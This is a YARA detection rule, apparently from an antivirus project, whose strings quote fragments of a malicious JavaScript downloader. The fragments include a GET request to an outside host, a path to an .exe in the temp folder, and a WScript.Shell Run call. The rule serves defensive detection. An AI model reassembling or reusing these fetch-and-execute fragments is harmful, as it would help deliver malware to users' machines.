rule sig_20160329_ecbafb10be49aca870111ffce936329d {
  meta:
    description = "datamaliciousorder - file 20160329_ecbafb10be49aca870111ffce936329d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f049f7b388c9e2305526af063dfd734ee3e9978ed74eb7ef2c210753bfc95232"

  strings:
    $s1  = "j[xT](\"GET\", \"http://www.the2ndedit.com/j1oisa\", false);" fullword ascii
    $s2  = "function WW() {return P[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"JcWoz53K.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[lm](y() * 11); if (j[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function O(MP, E){X0 = X0 * 1; return MP - E;};" fullword ascii
    $s5  = "var P = function R() {return WScript[U](\"WScript.Shell\");}(), y0 = 11;" fullword ascii
    $s6  = "function G(){return \"\" + X1;};" fullword ascii
    $s7  = "function Ik(h){P[\"Run\"](h, X0, X0);};" fullword ascii
    $s8  = "function X() {return ((Ti == true) && (Ti == Z)) ? 1 : X0;};" fullword ascii
    $s9  = "function y(){return 22;};" fullword ascii
    $s10 = "function M()" fullword ascii
    $s11 = "function L(){return U;};" fullword ascii
    $s12 = "function LN(og) {var Dg = (1, 2, 3, 4, 5, og); return Dg;};" fullword ascii
    $s13 = "var Yg = new this[\"Date\"]();" fullword ascii
    $s14 = " while (ba){" fullword ascii
    $s15 = "return O(v, g);" fullword ascii
    $s16 = "var w = false;" fullword ascii
    $s17 = "Z = true; " fullword ascii
    $s18 = "var Z = false;" fullword ascii
    $s19 = "var Ti = false;" fullword ascii
    $s20 = "Ti = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}